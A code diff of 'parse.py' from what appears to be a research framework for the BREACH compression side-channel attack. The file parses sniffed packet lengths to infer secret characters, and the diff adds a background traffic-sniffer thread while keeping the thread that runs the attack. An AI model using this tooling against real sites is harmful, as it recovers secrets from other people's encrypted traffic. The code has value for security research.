@@ -1,5 +1,11 @@
+'''
+File: parse.py
+Author: Dimitris Karakostas
+Description: Parser of sniffed packet lengths to manipulate the attack execution.
+'''
+
 from __future__ import division
-from os import system, path
+from os import system, path, mkdir, remove
 import sys
 import signal
 import datetime
@@ -8,7 +14,9 @@ import time
 import threading
 import constants
 import connect
+import sniff
 from iolibrary import kill_signal_handler, get_arguments_dict, setup_logger
+
 
 signal.signal(signal.SIGINT, kill_signal_handler)
 
@@ -30,6 +38,7 @@ class Parser():
         self.prefix = args_dict['prefix']
         self.latest_file = args_dict['latest_file']
         self.minimum_request_length = args_dict['minimum_request_length']
+        self.minimum_endpoint_request_length = args_dict['minimum_endpoint_request_length']
         self.method = args_dict['method']
         self.correct_val = args_dict['correct_val']
         self.sampling_ratio = args_dict['sampling_ratio']
@@ -70,7 +79,8 @@ class Parser():
             self.args_dict['win_logger'] = self.win_logger
         else:
             self.win_logger = args_dict['win_logger']
-        system('mkdir ' + self.history_folder)
+        if not path.exists('history'):
+            mkdir(self.history_folder)
         return
 
     def create_dictionary_sample(self, output_dict, iter_dict):
@@ -119,7 +129,8 @@ class Parser():
         '''
         with open(self.history_folder + self.filename + '/result_' + self.filename, 'a') as result_file:
             result_file.write('Combined output files\n\n')
-        system('cp out.out ' + self.history_folder + self.filename + '/out_' + self.filename + '_' + str(self.latest_file))
+        if path.exists('out.out'):
+            system('cp out.out ' + self.history_folder + self.filename + '/out_' + self.filename + '_' + str(self.latest_file))
         out_iterator = '0'
         total_requests = 0
         while int(out_iterator) < 10000000:
@@ -132,10 +143,11 @@ class Parser():
                 buff = []
                 grab_next = False
                 response_length = 0
-                in_bracket = True
+                # in_bracket = True
                 after_start = False
-                illegal_semaphore = 6  # Discard the first three iterations so that the system is stabilized the system is stabilized
+                illegal_semaphore = 6  # Discard the first three iterations so that the system is stabilized
                 illegal_iteration = False
+                user_request_count = 0
                 for line in output_file.readlines():
                     if len(buff) == len(self.alphabet):
                         if illegal_semaphore or illegal_iteration:
@@ -152,25 +164,27 @@ class Parser():
                     pref, size = line.split(': ')
                     if self.minimum_request_length:
                         if not after_start:
-                            if pref == 'User application payload' and int(size) > 1000:
+                            if pref == 'User application payload' and int(size) > self.minimum_request_length:
                                 after_start = True
-                                in_bracket = False
                             continue
                         else:
                             if pref == 'User application payload' and int(size) > self.minimum_request_length:
-                                if self.iterations[self.alphabet[0]] and (response_length == 0):
-                                    illegal_semaphore = illegal_semaphore + 2
-                                if in_bracket:
+                                user_request_count += 1
+                                if user_request_count == 1:
+                                    if self.iterations[self.alphabet[0]] and (response_length == 0):
+                                        illegal_semaphore += 2
                                     if illegal_semaphore:
                                         buff.append('%d: 0' % prev_request)
-                                        illegal_semaphore = illegal_semaphore - 1
+                                        illegal_semaphore -= 1
                                         illegal_iteration = True
                                     else:
                                         buff.append('%d: %d' % (prev_request, response_length))
                                     prev_request = prev_request + 1
-                                response_length = 0
-                                in_bracket = not in_bracket
-                            if pref == 'Endpoint application payload':
+                                    response_length = 0
+                                else:
+                                    user_request_count += 1
+                            if pref == 'Endpoint application payload' and int(size) > self.minimum_endpoint_request_length:
+                                user_request_count = 0
                                 response_length = response_length + int(size)
                     else:
                         if (pref == 'Endpoint application payload'):
@@ -227,7 +241,7 @@ class Parser():
                 alphabet.pop(0)
                 for i in enumerate(alphabet):
                     alphabet[i[0]] = i[1].split()[0]
-                found_correct = (j[1] == self.correct_val) if self.method == 's' else (self.correct_val in alphabet)
+                found_correct = (j[1] == self.correct_val) if self.method == 'serial' else (self.correct_val in alphabet)
                 if found_correct:
                     correct_pos = pos
                     correct_len = j[0]
@@ -281,7 +295,7 @@ class Parser():
         with open(self.history_folder + self.filename + '/result_' + self.filename, 'a') as result_file:
             result_file.write('\n')
             result_file.write('Iteration %d\n\n' % self.iterations[self.alphabet[0]])
-        if self.method == 's' and combined_sorted:
+        if self.method == 'serial' and combined_sorted:
             with open(self.history_folder + self.filename + '/result_' + self.filename, 'a') as result_file:
                 result_file.write('Correct Value is \'%s\' with divergence %f from second best.\n' % (combined_sorted[0][1], combined_sorted[1][0] - combined_sorted[0][0]))
         return points
@@ -328,9 +342,12 @@ class Parser():
         '''
         Continue the attack properly, after checkpoint was reached.
         '''
+        self.args_dict['win_count'][points[0][1]] += 1
+        self.args_dict['point_count'][points[0][1]] += points[0][0]
+        self.args_dict['point_count'][points[1][1]] += points[1][0]
         sorted_wins = self.sort_dictionary_values(self.args_dict['win_count'], True)
         if len(correct_alphabet) == 1:
-            if sorted_wins[0][0] > 10:
+            if sorted_wins[0][0] == constants.PARALLEL_REPEAT:
                 self.win_logger.debug('Total attempts: %d\n%s' % (self.try_counter + 1, str(sorted_wins)))
                 self.win_logger.debug('Aggregated points\n%s\n' % str(self.args_dict['point_count']))
                 self.args_dict['win_count'] = {}
@@ -344,10 +361,6 @@ class Parser():
                 self.attack_logger.debug('----------Continuing----------')
                 self.attack_logger.debug('Alphabet: %s' % str(self.alphabet))
             else:
-                self.args_dict['win_count'][points[0][1]] = self.args_dict['win_count'][points[0][1]] + 1
-                self.args_dict['point_count'][points[0][1]] = self.args_dict['point_count'][points[0][1]] + points[0][0]
-                self.args_dict['point_count'][points[1][1]] = self.args_dict['point_count'][points[1][1]] + points[1][0]
-                sorted_wins = self.sort_dictionary_values(self.args_dict['win_count'], True)
                 self.win_logger.debug('Total attempts: %d\n%s' % (self.try_counter + 1, str(sorted_wins)))
                 self.win_logger.debug('Aggregated points\n%s\n' % str(self.args_dict['point_count']))
                 self.attack_logger.debug('Correct Alphabet: %d Incorrect Alphabet: %d' % (points[0][0], points[1][0]))
@@ -355,7 +368,7 @@ class Parser():
         else:
             self.attack_logger.debug('Correct Alphabet: %s' % points[0][1])
             self.attack_logger.debug('Correct Alphabet: %d Incorrect Alphabet: %d' % (points[0][0], points[1][0]))
-            if sorted_wins[0][0] > 10:
+            if sorted_wins[0][0] == constants.PARALLEL_REPEAT:
                 self.win_logger.debug('Total attempts: %d\n%s' % (self.try_counter + 1, str(sorted_wins)))
                 self.win_logger.debug('Aggregated points\n%s\n' % str(self.args_dict['point_count']))
                 self.args_dict['win_count'] = {}
@@ -367,10 +380,6 @@ class Parser():
                 self.args_dict['alphabet'] = self.continue_parallel_division(correct_alphabet)
                 self.attack_logger.debug('SUCCESS: %s' % points[0][1])
             else:
-                self.args_dict['win_count'][points[0][1]] = self.args_dict['win_count'][points[0][1]] + 1
-                self.args_dict['point_count'][points[0][1]] = self.args_dict['point_count'][points[0][1]] + points[0][0]
-                self.args_dict['point_count'][points[1][1]] = self.args_dict['point_count'][points[1][1]] + points[1][0]
-                sorted_wins = self.sort_dictionary_values(self.args_dict['win_count'], True)
                 self.win_logger.debug('Total attempts: %d\n%s' % (self.try_counter + 1, str(sorted_wins)))
                 self.win_logger.debug('Aggregated points\n%s\n' % str(self.args_dict['point_count']))
         self.args_dict['latest_file'] = 0
@@ -380,19 +389,25 @@ class Parser():
         '''
         Prepare environment for parsing.
         '''
-        system('sudo rm ' + self.wdir + 'request.txt')
+        try:
+            remove(self.wdir + 'request.txt')
+        except OSError:
+            self.debug_logger.debug('Preparing parsing: request.txt does not exist.')
+
         time.sleep(5)
-        system('rm -f out.out')
+        if path.exists('out.out'):
+            remove('out.out')
         if not self.divide_and_conquer:
             self.alphabet = self.get_alphabet({'alpha_types': self.alpha_types, 'prefix': self.prefix, 'method': self.method})
             self.args_dict['alphabet'] = self.alphabet
-            if not self.args_dict['win_count']:
-                for item in self.alphabet:
-                    self.args_dict['win_count'][item] = 0
-            if not self.args_dict['point_count']:
-                for item in self.alphabet:
-                    self.args_dict['point_count'][item] = 0
-        system('cp request.txt ' + self.wdir)
+        if not self.args_dict['win_count']:
+            for item in self.alphabet:
+                self.args_dict['win_count'][item] = 0
+        if not self.args_dict['point_count']:
+            for item in self.alphabet:
+                self.args_dict['point_count'][item] = 0
+        if path.exists('request.txt'):
+            system('cp request.txt ' + self.wdir)
 
         if self.execute_breach:
             if 'connector' not in self.args_dict or not self.args_dict['connector'].isAlive():
@@ -405,13 +420,25 @@ class Parser():
             else:
                 self.connector = self.args_dict['connector']
 
+        if 'sniffer' not in self.args_dict or not self.args_dict['sniffer'].isAlive():
+            self.debug_logger.debug('Is sniffer in args_dict? %s' % str('sniffer' in self.args_dict))
+            if 'sniffer' in self.args_dict:
+                self.debug_logger.debug('Is sniffer alive? %s' % str(self.args_dict['sniffer'].isAlive()))
+            self.sniffer = SnifferThread(self.args_dict)
+            self.sniffer.start()
+            self.args_dict['sniffer'] = self.sniffer
+        else:
+            self.sniffer = self.args_dict['sniffer']
+
         self.try_counter = 0
         for _, value in self.args_dict['win_count'].items():
             self.try_counter = self.try_counter + value
         self.filename = 'try' + str(self.try_counter) + '_' + '_'.join(self.alpha_types) + '_' + self.prefix + '_' + str(self.divide_and_conquer)
-        system('mkdir ' + self.history_folder + self.filename)
-        system('cp request.txt ' + self.history_folder + self.filename + '/request_' + self.filename)
-        if self.method == 'p' and self.correct_val:
+        if not path.exists(self.history_folder + self.filename):
+            mkdir(self.history_folder + self.filename)
+        if path.exists('request.txt'):
+            system('sudo cp request.txt ' + self.history_folder + self.filename + '/request_' + self.filename)
+        if self.method == 'parallel' and self.correct_val:
             if self.correct_val in self.alphabet[0]:
                 self.correct_val = self.alphabet[0]
             elif self.correct_val in self.alphabet[1]:
@@ -438,7 +465,8 @@ class Parser():
             for i in self.alphabet:
                 self.iterations[i] = 0
                 self.output_sum[i] = 0
-            system('rm ' + self.history_folder + self.filename + '/result_' + self.filename)
+            if path.exists(self.history_folder + self.filename + '/result_' + self.filename):
+                remove(self.history_folder + self.filename + '/result_' + self.filename)
 
             self.get_aggregated_input()
 
@@ -449,16 +477,18 @@ class Parser():
             with open('sample.log', 'w') as f:
                 for s in self.samples:
                     f.write(str(s) + '\n')
-            system('mv sample.log ' + self.history_folder + self.filename + '/')
+            if path.exists('sample.log'):
+                system('mv sample.log ' + self.history_folder + self.filename + '/')
             points = self.log_with_correct_value() if self.correct_val else self.log_without_correct_value(combined_sorted)
-            if self.method == 's':
+            if self.method == 'serial':
                 correct_alphabet = self.log_result_serial(combined_sorted, points)
-            elif self.method == 'p':
+            elif self.method == 'parallel':
                 correct_alphabet = self.log_result_parallel(combined_sorted, points)
 
-            system('cat ' + self.history_folder + self.filename + '/result_' + self.filename)
+            if path.exists(self.history_folder + self.filename + '/result_' + self.filename):
+                system('cat ' + self.history_folder + self.filename + '/result_' + self.filename)
             points = self.sort_dictionary_values(points, True)
-            if (self.method == 'p' and points[0][0] > self.checkpoint/2) or (self.method == 's' and points[0][0] > self.checkpoint*10):
+            if (self.method == 'parallel' and points[0][0] > self.checkpoint/2) or (self.method == 'serial' and points[0][0] > self.checkpoint*10):
                 self.continue_next_hop = self.attack_forward(correct_alphabet, points)
                 break
             time.sleep(self.refresh_time)
@@ -485,7 +515,25 @@ class ConnectorThread(threading.Thread):
         self.debug_logger.debug('Created connector object')
         self.connector.execute_breach()
         self.debug_logger.debug('Connector has stopped running')
-        return
+
+
+class SnifferThread(threading.Thread):
+    '''
+    Thread to run network traffic sniffer on the background.
+    '''
+    def __init__(self, args_dict):
+        super(SnifferThread, self).__init__()
+        self.args_dict = args_dict
+        self.daemon = True
+        self.debug_logger = args_dict['debug_logger']
+        self.debug_logger.debug('Initialized sniffer thread')
+
+    def run(self):
+        self.sniffer = sniff.Sniffer(self.args_dict)
+        self.debug_logger.debug('Created sniffer object')
+        self.sniffer.sniff()
+        self.debug_logger.debug('Sniffer has stopped running')
+
 
 if __name__ == '__main__':
     args_dict = get_arguments_dict(sys.argv)
